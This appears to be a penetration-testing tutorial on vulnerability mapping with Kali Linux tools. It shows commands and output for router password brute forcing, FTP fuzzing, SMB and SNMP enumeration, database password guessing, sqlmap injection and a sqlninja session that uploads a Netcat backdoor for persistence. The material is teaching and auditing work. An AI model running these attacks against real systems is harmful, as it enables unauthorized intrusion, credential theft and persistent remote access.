# VULNERABILITY MAPPING

Vulnerability mapping is the process of identifying and analyzing the critical security flaws in a target environment.

## 1. Types of vulnerabilities


There are three main classes of vulnerability:

* **Design vulnerabilities**: These are discovered due to the weaknesses found in the software specifications
* **Implementation vulnerabilities**: These are the technical security glitches found in the code of a system
* **Operational vulnerabilities**: These are the vulnerabilities that may arise due to the improper configuration and deployment of a system in a specific environment

### 1.1 Local vulnerability

A condition on which the attacker requires local access in order to trigger the vulnerability by executing a piece of code is known as local vulnerability. By taking advantage of this type of vulnerability, an attacker can increase the access privileges to gain unrestricted access to the computer.

### 1.2 Remote vulnerability

Remote vulnerability is a condition where the attacker has no prior access but the vulnerability can still be exploited by triggering the malicious piece of code over the network. This type of vulnerability allows an attacker to gain remote access to a computer without facing any physical or local barriers.

### 1.3 Taxonomy

Security taxonomy: Resource link

HP Software: securityhttp://www.hpenterprisesecurity.com/vulncat/en/vulncat/index.html

Seven pernicious kingdoms: http://www.cigital.com/papers/download/bsi11-taxonomy.pdf

Common Weakness Enumeration: http://cwe.mitre.org/data/index.html

OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project

Klocwork: http://www.klocwork.com/products/documentation/Insight-9.1/Taxonomy

GrammaTech: http://www.grammatech.com

WASC Threat Classification: http://projects.webappsec.org/Threat-Classification


## 2. OPEN VULNERABILITY ASSESSMENT SYSTEM (OpenVAS)

The OpenVAS is a wrapper for a collection of security tools and services that, when combined, produces a powerful vulnerability management platform. It has been developed on the basis of a client-server architecture, where the client requests a specific set of network vulnerability tests against its target from the server.

	* OpenVAS scanner
	* OpenVAS Client
	* OpenVAS Manager
	* Greenbone Security Assistant
	* OpenVAS Administrator

### 2.3 Tools used by OpenVAS

	Security tool			Description
	-------------------------------------------
	Amap				An application protocol detection tool
	Ike-scan			IPsec VPN scanning, fingerprinting, and testing
	Ldapsearch			Extracts information from LDAP dictionaries
	Nikto				Web server assessment tool
	Nmap				Port scanner
	Ovaldi				Open vulnerability and assessment language interpreter
	pnscan				Port scanner
	Portbunny			Port scanner
	Seccubus			Automates the regular OpenVAS scans
	SLAD				Security Local Auditing Daemon tools include John-the-Ripper, Chkrootkit, ClamAV, Snort, Logwatch, Tripwire, Lsof,		Tiger, TrapWatch, and LM-sensors
	Snmpwalk			SNMP data extractor
	Strobe				Port scanner
	w3af				Web application attack and audit framework


## 3. CISCO ANALYSIS

### 3.1 CISCO AUDITING TOOL

Cisco Auditing Tool (CAT) is a mini security auditing tool. It scans the Cisco routers for common vulnerabilities such as default passwords, SNMP community strings, and some old IOS bugs.

To start CAT, navigate to Kali Linux | Vulnerability Analysis | Cisco Tools | cisco–auditing-tool.

In case you decide to use the terminal program directly, execute the following commands:

> cd /usr/share/

> CAT --help

This will show you all the options and descriptions about the usage of CAT. Let's execute the following options against our target Cisco device:

	* -h: This is the hostname (for scanning single hosts)
	* -w: This is a wordlist (wordlist for community name guessing)
	* -a: This is a passlist (wordlist for password guessing)
	* -i: This is [ioshist] (check for IOS History bug)

This combination will brute force and scan the Cisco device for any known passwords, community names, and possibly the old IOS bugs. Before performing this exercise, we have to update our list of passwords and community strings at this location in order to have a better chance of success: /usr/share/cisco-auditing-tool/lists. The following is an input and output command from the Kali Linux console:

> CAT -h ww.xx.yy.zz -w lists/community -a lists/passwords -i

	Cisco Auditing Tool - g0ne [null0]

	Checking Host: ww.xx.yy.zz

	Guessing passwords:
	Invalid Password: diamond
	Invalid Password: cmaker
	Invalid Password: changeme
	Invalid Password: cisco
	Invalid Password: admin
	Invalid Password: default
	Invalid Password: Cisco
	Invalid Password: ciscos
	Invalid Password: cisco1
	Invalid Password: router
	Invalid Password: router1
	Invalid Password: _Cisco
	Invalid Password: blender
	Password Found: pixadmin
	...
	Guessing Community Names:
	Invalid Community Name: public
	Invalid Community Name: private
	Community Name Found: cisco
	...



### 3.2 CISCO GLOBAL EXPLOITER

Cisco Global Exploiter (CGE) is a small Perl script that combines 14 individual vulnerabilities that can be tested against the Cisco devices.
Not for all devices though, limited scope.

To start CGE, navigate to Kali Linux | Vulnerability Analysis | Cisco Tools | cisco-global-exploiter or, using the console, execute the following commands:

>  cd /usr/bin/

>  cge.pl

>  cge.pl 10.200.213.25 3

	Vulnerability successful exploited with [http:// 10.200.213.25/level/17/exec/....] ...


## 4. FUZZ ANALYSIS

There are different classes of fuzzers available in Kali Linux, which can be used to test the file formats, network protocols, command-line inputs, environmental variables, and web applications.

What key steps are involved in fuzzy analysis?

Six common steps should be undertaken. They include identifying the target, identifying inputs, generating fuzz data, executing fuzz data, monitoring the output, and determining the exploitability. These steps are explained in more detail in the Fuzzing: Brute Force Vulnerability Discovery presentation available at http://recon.cx/en/f/msutton-fuzzing.ppt .


### 4.1 BED (Bruteforce Exploit Detector)

Bruteforce Exploit Detector (BED) is a powerful tool designed to fuzz the plain text protocols against potential buffer overflows, format string bugs, integer overflows, DoS conditions, and so on. It automatically tests the implementation of a chosen protocol by sending different combinations of commands with problematic strings to confuse the target. The protocols supported by this tool are ftp, smtp, pop, http, irc, imap, pjl, lpd, finger, socks4, and socks5.

To start BED, navigate to Kali Linux | Vulnerability Analysis | Fuzzing Tools | bed or use the following command to execute it from your shell:

>  cd /usr/share/bed/

>  bed.pl

Note that the description about the specific protocol plugin can be retrieved with the following command:

>  bed –s FTP


>  bed -s FTP -u ftpuser -v ftpuser -t 192.168.0.7 -p 21 -o 3

	BED 0.5 by mjm ( www.codito.de ) & eric ( www.snake-basket.de)

	+ Buffer overflow testing:
	testing: 1 USER XAXAX ...........
	testing: 2 USER ftpuserPASS XAXAX ...........

	+ Formatstring testing:
	testing: 1 USER XAXAX .......
	testing: 2 USER ftpuserPASS XAXAX .......
	* Normal tests

	+ Buffer overflow testing:
	testing: 1 ACCT XAXAX ...........
	testing: 2 APPE XAXAX ...........
	testing: 3 ALLO XAXAX ...........
	testing: 4 CWD XAXAX ...........
	testing: 5 CEL XAXAX ...........
	testing: 6 DELE XAXAX ...........
	testing: 7 HELP XAXAX ...........
	testing: 8 MDTM XAXAX ...........
	testing: 9 MLST XAXAX ...........
	testing: 10 MODE XAXAX ...........
	testing: 11 MKD XAXAX ...........
	testing: 12 MKD XAXAXCWD XAXAX ...........
	testing: 13 MKD XAXAXDELE XAXAX ...........
	testing: 14 MKD XAXAXRMD XAXAX .....connection attempt failed: No route to host

From the output, we can anticipate that the remote FTP daemon has been interrupted during the fourteenth test case. This could be a clear indication of a buffer overflow bug; however, the problem can be further investigated by looking into a specific plugin module and locating the pattern of the test case (for example, /usr/share/bed/bedmod/ftp.pm). It is always a good idea to test your target at least two more times by resetting it to a normal state, increasing the timeout value (-o), and checking if the problem is reproducible.



### 4.2 JBROFUZZ

JBroFuzz is a well-known platform to fuzzy test web applications. It supports web requests over the HTTP and HTTPS protocol. By providing a simple URL for the target domain and selecting the part of a web request to fuzz, an auditor can either select to craft the manual request or use the predefined set of payloads database (for example, cross-site scripting, SQL injection, buffer overflow, format string errors, and so on) to generate some malicious requests based on the previously known vulnerabilities and send them to the target web server.

The corresponding responses will then be recorded for further inspection. Based on the type of testing that is performed, these responses or results should be manually investigated in order to recognize any possible exploit condition.

The key options provided under JBroFuzz are fuzz management, payload categories, sniffing the web requests and replies through browser proxy, and enumerating the web directories.

To start JBroFuzz, use the console to execute the following commands:

>  cd /usr/share/zaproxy/lib/jbrofuzz/

>  java -jar JBroFuzz.jar


Now let's take an example by testing the target web application using the following steps:

1. We select the URL of our target domain as http://testasp.example.com, which hosts the ASP web application. In the Request panel, we also modify the HTTP request to suit our testing criteria as follows:
			GET /showthread.asp?id=4 HTTP/1.0
			Host: testasp.example.com
			User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB;
			rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
			Accept: text/html,application/xhtml+xml,application/
			xml;q=0.9,*/*;q=0.8
			Accept-Language: en-gb,en;q=0.5
			Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
2. Before crafting the preceding request, we already knew that the resource URL, http://testasp.example.com/showthread.asp?id=4, does exist on the web server.
3. Create a manual request and then target the specific part of a URL (id=4) with a SQL injection payload.
4. Highlight a numeric value, 4, in the first line and click on the add button (+) in the top toolbar.
5. In the new window, select the SQL Injection category, fuzzer name SQL Injection, and click on the Add Fuzzer button.
6. Once the fuzzer is finalized, you will see that it is listed under Added Payloads Table in the right-hand corner of the main window.



## 5. SMB ANALYSIS

Server Message Block (SMB) is an application-layer protocol, which is commonly used to provide file and printer sharing services. Moreover, it is also capable of handling the shared services between serial ports and laid miscellaneous communications between different nodes on the network. It is also known as CIFS (Common Internet File System).

SMB is purely based on a client-server architecture and has been implemented on various operating systems such as Linux and Windows. Network Basic Input Output System (NetBIOS) is an integral part of the SMB protocol, which implements the transport service on Windows systems. NetBIOS runs on top of the TCP/IP protocol (NBT) and thus allows each computer with a unique network name and IP address to communicate over Local Area Network (LAN).

Additionally, the DCE/RPC service uses SMB as a channel for authenticated inter-process communication (IPC) between network nodes. This phenomenon allows the communication between processes and computers to share data on the authenticated channel. The NetBIOS services are commonly offered on various TCP and UDP ports (135, 137, 138, 139, and 445).



### 5.1 IMPACKET SAMRDUMP

Samrdump is an application that retrieves sensitive information about the specified target using Security Account Manager (SAM), which is a remote interface that is accessible under the Distributed Computing Environment / Remote Procedure Calls (DCE/RPC) service. It lists out all the system shares, user accounts, and other useful information about the target's presence in the local network.

To start Impacket Samrdump, execute the following commands in your shell:

>  cd /usr/share/doc/python-impacket-doc/examples/samrdump.py

>  python samrdump.py

>  python samrdump.py h4x:123@192.168.0.7 445/SMB

	Retrieving endpoint list from 192.168.0.7
	Trying protocol 445/SMB...
	Found domain(s):
	. CUSTDESK
	. Builtin

	Looking up users in domain CUSTDESK

	Found user: Administrator, uid = 500
	Found user: ASPNET, uid = 1005
	Found user: Guest, uid = 501
	Found user: h4x, uid = 1010
	Found user: HelpAssistant, uid = 1000
	Found user: IUSR_MODESK, uid = 1004
	Found user: IWAM_MODESK, uid = 1009
	Found user: MoDesktop, uid = 1003
	Found user: SUPPORT_388945a0, uid = 1002
	Administrator (500)/Enabled: true
	...


## 6. SNMP ANALYSIS

SNMP (Simple Network Management Protocol) is an application-layer protocol that is designed to run on the UDP port 161. Its main function is to monitor all the network devices for conditions that may require administrative attention, such as a power outage or an unreachable destination. The SNMP-enabled network typically consists of network devices, a manager, and an agent.

- A manager controls the administrative tasks for the network management and monitoring operations.
- An agent is a software that runs on the network devices, and these network devices could involve routers, switches, hubs, IP cameras, bridges, and sometimes operating system machines (Linux, Windows). These agent-enabled devices report information about their bandwidth, uptime, running processes, network interfaces, system services, and other crucial data to the manager via SNMP.
- The information is transferred and saved in the form of variables that describe the system configuration. These variables are organized in systematic hierarchies known as Management Information Bases (MIBs), where each variable is identified with a unique Object Identifier (OID). A total of three versions are available for SNMP (v1, v2, v3).

The tools that we present in this section will mainly target v1- and v2c-based SNMP devices.


### 6.1 SNMP WALK

SNMP Walk is a powerful information-gathering tool. It extracts all the device configuration data, depending on the type of device that is under examination. Such data is very useful and informative in terms of launching further attacks and exploitation attempts against the target.

>  snmpwalk

The main advantage of using SNMP Walk is its ability to communicate with three different versions of SNMP protocol (v1, v2c, v3).

>  snmpwalk -v 2c -c public -O T -L f snmpwalk.txt 10.20.127.49

	SNMPv2-MIB::sysDescr.0 = STRING: Hardware: x86 Family 15 Model 4
	Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 5.2 (Build 3790 Multiprocessor Free)

	SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.311.1.1.3.1.2

	DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1471010940) 170 days, 6:08:29.40

	SNMPv2-MIB::sysContact.0 = STRING:
	SNMPv2-MIB::sysName.0 = STRING: CVMBC-UNITY
	SNMPv2-MIB::sysLocation.0 = STRING:
	SNMPv2-MIB::sysServices.0 = INTEGER: 76
	IF-MIB::ifNumber.0 = INTEGER: 4
	IF-MIB::ifIndex.1 = INTEGER: 1
	IF-MIB::ifIndex.65538 = INTEGER: 65538
	IF-MIB::ifIndex.65539 = INTEGER: 65539

	IF-MIB::ifIndex.65540 = INTEGER: 65540
	IF-MIB::ifDescr.1 = STRING: Internal loopback interface for 127.0.0
	network
	IF-MIB::ifDescr.65538 = STRING: Internal RAS Server interface for dial in
	clients
	IF-MIB::ifDescr.65539 = STRING: HP NC7782 Gigabit Server Adapter #2
	IF-MIB::ifDescr.65540 = STRING: HP NC7782 Gigabit Server Adapter
	IF-MIB::ifType.1 = INTEGER: softwareLoopback(24)
	IF-MIB::ifType.65538 = INTEGER: ppp(23)
	IF-MIB::ifType.65539 = INTEGER: ethernetCsmacd(6)
	IF-MIB::ifType.65540 = INTEGER: ethernetCsmacd(6)
	IF-MIB::ifMtu.1 = INTEGER: 32768
	IF-MIB::ifMtu.65538 = INTEGER: 0
	IF-MIB::ifMtu.65539 = INTEGER: 1500
	...
	IF-MIB::ifPhysAddress.65539 = STRING: 0:13:21:c8:69:b2
	IF-MIB::ifPhysAddress.65540 = STRING: 0:13:21:c8:69:b3
	IF-MIB::ifAdminStatus.1 = INTEGER: up(1)
	...
	IP-MIB::ipAdEntAddr.127.0.0.1 = IpAddress: 127.0.0.1
	IP-MIB::ipAdEntAddr.192.168.1.3 = IpAddress: 192.168.1.3
	IP-MIB::ipAdEntAddr.192.168.1.100 = IpAddress: 192.168.1.100
	IP-MIB::ipAdEntAddr.10.20.127.52 = IpAddress: 10.20.127.52
	IP-MIB::ipAdEntIfIndex.127.0.0.1 = INTEGER: 1
	IP-MIB::ipAdEntIfIndex.192.168.1.3 = INTEGER: 65540
	IP-MIB::ipAdEntIfIndex.192.168.1.100 = INTEGER: 65538
	IP-MIB::ipAdEntIfIndex.10.20.127.52 = INTEGER: 65539
	IP-MIB::ipAdEntNetMask.127.0.0.1 = IpAddress: 255.0.0.0
	IP-MIB::ipAdEntNetMask.192.168.1.3 = IpAddress: 255.255.255.0
	IP-MIB::ipAdEntNetMask.192.168.1.100 = IpAddress: 255.255.255.255
	IP-MIB::ipAdEntNetMask.10.20.127.52 = IpAddress: 255.255.255.248
	IP-MIB::ipAdEntBcastAddr.127.0.0.1 = INTEGER: 1
	IP-MIB::ipAdEntBcastAddr.192.168.1.3 = INTEGER: 1
	IP-MIB::ipAdEntBcastAddr.192.168.1.100 = INTEGER: 1
	IP-MIB::ipAdEntBcastAddr.10.20.127.52 = INTEGER: 1
	IP-MIB::ipAdEntReasmMaxSize.127.0.0.1 = INTEGER: 65535

	IP-MIB::ipAdEntReasmMaxSize.192.168.1.3 = INTEGER: 65535
	IP-MIB::ipAdEntReasmMaxSize.192.168.1.100 = INTEGER: 65535
	IP-MIB::ipAdEntReasmMaxSize.10.20.127.52 = INTEGER: 65535
	RFC1213-MIB::ipRouteDest.0.0.0.0 = IpAddress: 0.0.0.0
	RFC1213-MIB::ipRouteDest.127.0.0.0 = IpAddress: 127.0.0.0
	RFC1213-MIB::ipRouteDest.127.0.0.1 = IpAddress: 127.0.0.1
	RFC1213-MIB::ipRouteDest.192.168.1.0 = IpAddress: 192.168.1.0
	RFC1213-MIB::ipRouteDest.192.168.1.3 = IpAddress: 192.168.1.3
	RFC1213-MIB::ipRouteDest.192.168.1.100 = IpAddress: 192.168.1.100
	RFC1213-MIB::ipRouteDest.192.168.1.255 = IpAddress: 192.168.1.255
	RFC1213-MIB::ipRouteDest.10.20.127.48 = IpAddress: 10.20.127.48
	RFC1213-MIB::ipRouteDest.10.20.127.52 = IpAddress: 10.20.127.52
	RFC1213-MIB::ipRouteDest.10.20.127.255 = IpAddress: 10.20.127.255
	...


Information extracted from the preceding code provides us with useful insights for the target machine. The command-line switch, -c, represents the community string that is to be used to extract MIBs, -O is used to print the output in a human-readable text format (T), and -L is used to log the data into a file (f snmpwalk.txt). More information on the various uses of SNMP Walk can be found at http://net-snmp.sourceforge.net/wiki/index.php/TUT:snmpwalk



## 7. WEB APPLICATION ANALYSIS

In this section, we have divided our approach to test web applications and databases individually. However, it is extremely important for you to understand the basic relationship and architecture of a combined technology infrastructure. The assessment tools provided in Kali Linux can be used to measure the security of web applications and databases in a joint technology evaluation process. You attack the backend via the web page or the frontend (for example, the process of a SQL injection attack).



### 7.1 DATABASE ASSESSMENT TOOLS

In this section, we have combined all the three categories of Kali Linux database analysis tools (MSSQL, MySQL, and Oracle) and presented the selected tools based on their main functions and capabilities. This set of tools mainly deals with fingerprinting, enumeration, password auditing, and assessing the target with SQL injection attacks, thus allowing an auditor to review the weaknesses found in the front-end web application as well as the back-end database.


#### DBPwAUDIT

Java-based tool designed to audit passwords for Oracle, MySQL, MS-SQL, and IBM DB2 servers. It helps the pentester to discover
valid user accounts on the database management system, if not hardened with a secure password policy. It currently supports the dictionary-based password attack mechanism.

Kali Linux | Vulnerability Analysis | Database Assessment | dbpwaudit

>  cd /usr/share/dbpwaudit/

>  dbpwaudit

To know which database drivers are supported by DBPwAudit, execute the following command:

>  dbpwaudit -L

>  dbpwaudit -s 10.2.251.24 -d pokeronline -D MySQL -U \ users.txt -P passwords.txt

	DBPwAudit v0.8 by Patrik Karlsson <patrik@cqure.net>
	----------------------------------------------------
	[Tue Sep 14 17:55:41 UTC 2013] Starting password audit ...
	[Tue Sep 14 17:55:41 UTC 2013] Testing user: root, pass: admin123
	[Tue Sep 14 17:55:41 UTC 2013] Testing user: pokertab, pass: admin123
	ERROR: message: Access denied for user 'root'@'10.2.206.18' (using
	password: YES), code: 1045
	[Tue Sep 14 17:55:50 UTC 2013] Testing user: root, pass: RolVer123
	ERROR: message: Access denied for user 'pokertab'@'10.2.206.18' (using
	password: YES), code: 1045
	[Tue Sep 14 17:55:56 UTC 2013] Testing user: pokertab, pass: RolVer123
	...
	[Tue Sep 14 17:56:51 UTC 2013] Finnishing password audit ...
	Results for password scan against 10.2.251.24 using provider MySQL
	------------------------------------------------------
	user: pokertab pass: RolVer123
	Tested 12 passwords in 69.823 seconds (0.17186314tries/sec)



#### SQLMAP

SQLMap is an advanced and automatic SQL injection tool. Its main purpose is to scan, detect, and exploit the SQL injection flaws for a given URL.

SQLMap employs four unique SQL injection techniques; these include inferential blind SQL injection, UNION query SQL injection, stacked queries, and time-based blind SQL injection. Its broad range of features and options include database fingerprinting, enumerating, data extracting, accessing the target filesystem, and executing the arbitrary commands with full operating system access.

SQLMap also provides an opportunity to scan the Google search engine with classified Google dorks to extract specific targets.

>  cd /usr/share/sqlmap/

>  sqlmap -h

In the following example, we will use the number of options to fingerprint and enumerate some information from the target application database system:

>  sqlmap -u "http://testphp.example.com/artists.php?artist=2" -p "artist" -f -b --current-user --current-db --dbs --users

	...
	[*] starting at: 11:21:43
	[11:21:43] [INFO] using '/usr/share/sqlmap/output/testphp.example.com/session' as session file
	[11:21:43] [INFO] testing connection to the target url
	[11:21:45] [INFO] testing if the url is stable, wait a few seconds
	[11:21:49] [INFO] url is stable
	[11:21:49] [INFO] testing sql injection on GET parameter 'artist' with 0 parenthesis
	[11:21:49] [INFO] testing unescaped numeric injection on GET parameter 'artist'
	[11:21:51] [INFO] confirming unescaped numeric injection on GET parameter 'artist'
	[11:21:53] [INFO] GET parameter 'artist' is unescaped numeric injectable with 0 parenthesis
	[11:21:53] [INFO] testing for parenthesis on injectable parameter
	[11:21:56] [INFO] the injectable parameter requires 0 parenthesis
	[11:21:56] [INFO] testing MySQL
	[11:21:57] [INFO] confirming MySQL
	[11:21:59] [INFO] retrieved: 2
	[11:22:11] [INFO] the back-end DBMS is MySQL
	[11:22:11] [INFO] fetching banner
	[11:22:11] [INFO] retrieved: 5.0.22-Debian_0ubuntu6.06.6-log
	[11:27:36] [INFO] the back-end DBMS operating system is Linux Debian or Ubuntu
	...

	[11:28:00] [INFO] executing MySQL comment injection fingerprint
	web server operating system: Linux Ubuntu 6.10 or 6.06 (Edgy Eft or	Dapper Drake)
	web application technology: Apache 2.0.55, PHP 5.1.2
	back-end DBMS operating system: Linux Debian or Ubuntu
	back-end DBMS: active fingerprint: MySQL >= 5.0.11 and < 5.0.38
	comment injection fingerprint: MySQL 5.0.22
	banner parsing fingerprint: MySQL 5.0.22, logging enabled
	html error message fingerprint: MySQL
	[11:31:49] [INFO] fetching banner
	[11:31:49] [INFO] the back-end DBMS operating system is Linux Debian or Ubuntu
	banner: '5.0.22-Debian_0ubuntu6.06.6-log'
	[11:31:49] [INFO] fetching current user
	[11:31:49] [INFO] retrieved: fanart@localhost
	current user: 'fanart@localhost'
	[11:34:47] [INFO] fetching current database
	[11:34:47] [INFO] retrieved: fanart
	current database: 'fanart'

	[11:35:57] [INFO] fetching database users
	[11:35:57] [INFO] fetching number of database users
	[11:35:57] [INFO] retrieved: 1
	[11:36:04] [INFO] retrieved: 'fanart'@'localhost'
	database management system users [1]:
	[*] 'fanart'@'localhost'

	[11:39:56] [INFO] fetching database names
	[11:39:56] [INFO] fetching number of databases
	[11:39:56] [INFO] retrieved: 3
	[11:40:05] [INFO] retrieved: information_schema
	[11:43:18] [INFO] retrieved: fanart
	[11:44:24] [INFO] retrieved: modrewriteShop
	available databases [3]:
	[*] fanart
	[*] information_schema
	[*] modrewriteShop

	[11:47:05] [INFO] Fetched data logged to text files under '/usr/share/
	sqlmap/output/testphp.example.com'
	...

In our second test, we will demonstrate the use of --tables and the -D option to extract the list of tables from a fanart database as follows:

>  sqlmap -u "http://testphp.example.com/artists.php?artist=2" --tables -D fanart -v 0

	[*] starting at: 12:03:53

	web server operating system: Linux Ubuntu 6.10 or 6.06 (Edgy Eft or	Dapper Drake)
	web application technology: Apache 2.0.55, PHP 5.1.2
	back-end DBMS: MySQL 5
	Database: fanart
	[7 tables]
	+-----------+
	| artists |
	| carts |
	| categ |
	| featured |
	| guestbook |
	| pictures |
	| users |
	+-----------+

At this point, we can also select to automate the database-dumping process using the --dump or --dump all option. More advanced options such as --os-cmd , --os-shell, or --os-pwn will help the penetration tester to gain remote access to the system and execute arbitrary commands. However, this feature is workable only on the MS-SQL, MySQL, and PostgreSQL database, which underlies an operating system. In order to do more practice-based pen-testing on the other set of options, we recommend you go through the examples in the tutorial at: http://sqlmap.sourceforge.net/doc/README.html.

#### SQL NINJA

SQL Ninja is a specialized tool that is developed to target those web applications that use MS-SQL Server on the back-end and are vulnerable to SQL injection flaws.

Its main goal is to exploit these vulnerabilities to take over the remote database server through an interactive command shell instead of just extracting the data out of the database.

Thus, it is not a tool that scans and discovers the SQL injection vulnerabilities but one that exploits any such existing vulnerability to gain OS access.

Kali Linux | Vulnerability Analysis | Database Assessment | sqlninja

>  sqlninja

We must first make some adjustments to the config file.

>  cd /usr/share/doc/sqlninja/

>  gzip –d sqlninja.conf.example.gz

>  cp sqlninja.conf.example.gz /usr/share/sqlninja/sqlninja.conf

You must edit the configuration file appropriately to match your testing. You will need to uncomment those settings in the configuration file that you would like to have parsed and replace the settings within the file that you would like to run.

	# vim sqlninja.conf
	...
	# Host (required)
	host = testasp.example.com
	# Port (optional, default: 80)
	port = 80
	# Vulnerable page (e.g.: /dir/target.asp)
	page = /showforum.asp
	stringstart = id=0;
	# Local host: your IP address (for backscan and revshell modes)
	lhost = 192.168.0.3
	msfpath = /usr/share/exploits/framework3
	# Name of the procedure to use/create to launch commands. Default is
	# "xp_cmdshell". If set to "NULL", openrowset+sp_oacreate will be used
	# for each command
	xp_name = xp_cmdshell
	...

It is necessary to examine any possible SQL injection vulnerability using other tools before you start using SQL Ninja.

We will use the attack mode -m with t/test:

>  sqlninja -m t

	Sqlninja rel. 0.2.3
	Copyright (C) 2006-2008 icesurfer <r00t@northernfortress.net>
	[+] Parsing configuration file................
	[+] Target is: testasp.targetdomain.com
	[+] Trying to inject a 'waitfor delay'....
	[+] Injection was successful! Let's rock !! :)
	...

We can now move our steps to fingerprint the target and get more information about SQL Server and its underlying operating system privileges:

>  sqlninja -m f

	Sqlninja rel. 0.2.3
	Copyright (C) 2006-2008 icesurfer <r00t@northernfortress.net>
	[+] Parsing configuration file................
	[+] Target is: testasp.example.com
	What do you want to discover ?
	0 - Database version (2000/2005)
	1 - Database user
	2 - Database user rights
	3 - Whether xp_cmdshell is working
	4 - Whether mixed or Windows-only authentication is used
	a - All of the above
	h - Print this menu
	q - exit

>	a

	[+] Checking SQL Server version...
	Target: Microsoft SQL Server 2005
	[+] Checking whether we are sysadmin...
	No, we are not 'sa'.... :/
	[+] Finding dbuser length...
	Got it ! Length = 8
	[+] Now going for the characters........
	DB User is....: achcMiU9
	[+] Checking whether user is member of sysadmin server role....
	You are an administrator !
	[+] Checking whether xp_cmdshell is available
	xp_cmdshell seems to be available :)
	Mixed authentication seems to be used

>	q

	...

This shows us that the target system is vulnerable and not hardened with a better database security policy. From here, we get an opportunity to upload a Netcat backdoor, which would allow you some persistence and use any type of shell to get an interactive command prompt from a compromised target.

>  sqlninja -m u

	Sqlninja rel. 0.2.3
	Copyright (C) 2006-2008 icesurfer <r00t@northernfortress.net>
	[+] Parsing configuration file................
	[+] Target is: testasp.targetdomain.com
	File to upload:
	shortcuts: 1=scripts/nc.scr 2=scripts/dnstun.scr

>	1

	[+] Uploading scripts/nc.scr debug script............
	1540/1540 lines written
	done !
	[+] Converting script to executable... might take a while
	[+] Completed: nc.exe is uploaded and available !


More information on SQL Ninja's usage and configuration is available at http://sqlninja.sourceforge.net/sqlninja-howto.html.


### 7.2 WEB APPLICATION ASSESSMENT
==========================

The tools presented in this section mainly focus on the front-end security of web infrastructure. They can be used to identify, analyze, and exploit a wide range of application security vulnerabilities. These include cross-site scripting (XSS), SQL injection, SSI injection, XML injection, application misconfiguration, abuse of functionality, session prediction, information disclosure, and many other attacks and weaknesses.

#### BURP SUITE

In our exercise, we will analyze a small web application using a number of Burp Suite tools.

The steps to detect the possibility of a SQL injection vulnerability are listed as follows:

1. First, navigate to Proxy | Options and verify the proxy listeners property. In our case, we left the default settings to listen on port 8080. More options such as host redirection, SSL certificate, client request interception, server response interception, page properties, and header modifications can be used to match your application's assessment criteria.

2. Navigate to Proxy | Intercept and verify that the intercept is on tab is enabled.

3. Open your favorite browser (Firefox, for example) and set up the local proxy for HTTP/HTTPs transactions (127.0.0.1, 8080) to intercept, inspect, and modify the requests between the browser and target web application. All the consequent responses will be recorded accordingly. Here, the Burp Suite application acts as the man-in-the-middle (MITM) proxy.

4. Surf the target website (for example, http://testphp.example.com) and you will notice that the request has been trapped under Proxy | Intercept. In our case, we decide to forward this request without any modification. If you decide to modify any such request, you can do so with the Raw, Headers, or Hex tabs. Note that any other target application resources (for example, images and flash files) might generate individual requests while accessing the index page.

5. We strongly recommend you to visit as many pages as possible and try to help Burp Suite index the list of available pages mainly with the GET and POST requests. You can also use Spider to automate this process. To accomplish indexing with Spider, navigate to Target | Site map, right-click on your target website (for example, http://testphp.example.com), and select spider this host. This will help you discover and scan the number of available pages automatically and follow up any form requests manually (for example, the login page). Once this operation is over, you can navigate to Target | Site map and check the right-side panel with the list of accessible web pages and their properties (methods, URLs, parameters, response code, and so on).

6. Select a web page with the GET or POST parameters in order to test it with Intruder. The key is to enumerate possible identifiers, harvest useful data, and fuzz the parameters for known vulnerabilities. Right-click on the selected request and choose send to intruder. In our case, we select http://testphp.example.com/listproducts.php?artist=2 to find out the known vulnerabilities by injecting the variable length of characters instead of 2.

7. In the next step, we define the attack type and payload position (Intruder | Positions) to automate our test cases. The notification for the payload placement is given by the §2§ signature. We then step into the Intruder | Payloads section to choose the specific payload from a predefined list, Character blocks. Remember, you can also specify your own custom payload. Once the whole setting is in place, navigate to Intruder | Start in the menu bar. This will pop up another window that lists all requests being executed against the target application. After these requests have been processed as per the chosen payload, we decide to compare certain responses in order to identify unexpected application behavior. This can be done by simply right-clicking on the selected request and choosing send to comparer. At least two or more different requests or responses can be compared based on words or bytes. To learn more about different attack types visit http://www.portswigger.net/burp/help/intruder_positions.html#attacktype, while to understand the payload types payload options, visit http://www.portswigger.net/burp/help/intruder_payloads_types.html.

8. During the response comparison, we discovered the SQL injection vulnerability with one of our payload requests. Hence, to verify its authenticity, we decided to simulate that request again with Repeater by right-clicking on it and selecting send request to repeater instead of selecting comparer from a pop-up window. Click on the go button under the Repeater tab in order to get a response for the desired request. You will notice the response instantly. In our case, we notice the following error in a response page:

		Error: Unknown column 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		AAAAAAAAAAAAAAAAAAAAA' in 'where clause'
		Warning : mysql_fetch_array(): supplied argument is not a
		valid MySQL result resource in
		/var/www/vhosts/default/htdocs/listproducts.php on line 74

9. This clearly shows us the possibility of the SQL injection vulnerability. Beside these kind of weaknesses, we can also test our application session tokens for randomness using sequencer to uncover the session prediction vulnerability. The basic use of sequencer has been mentioned at http://www.portswigger.net/suite/sequencerhelp.html.


#### NIKTO 2

Nikto2 is a basic web server security scanner. It scans and detects the security vulnerabilities caused by server misconfiguration, default and insecure files, and outdated server application.

Kali Linux | Web Applications | Web Vulnerability Scanners | nikto

In our exercise, we select to execute a specific set of tests against the target using the -T tuning option. In order to learn more about each option and its usage, visit http://cirt.net/nikto2-docs/

>  nikto -h testphp.example.com -p 80 -T 3478b -t 3 -D \ V -o webtest -F htm

	- Nikto v2.1.5
	--------------------------------------------------------------
	V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_apache_expect_xss
	V:Sat Sep 18 14:39:37 2013 - Loaded "Apache Expect XSS" plugin.
	V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_apacheusers
	V:Sat Sep 18 14:39:37 2013 - Loaded "Apache Users" plugin.
	V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_cgi
	V:Sat Sep 18 14:39:37 2013 - Loaded "CGI" plugin.
